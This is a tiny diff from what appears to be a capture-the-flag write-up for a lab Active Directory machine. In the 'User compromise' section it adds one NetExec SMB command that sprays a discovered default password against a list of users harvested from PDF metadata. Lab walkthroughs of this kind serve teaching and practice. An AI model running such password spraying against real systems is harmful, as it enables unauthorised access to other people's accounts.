@@ -344,5 +344,7 @@ Ill spray this against some of the users found in the metadata of the PDFs
 
 # User compromise
 ```python
+nxc smb dc.intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
+
 
 ```
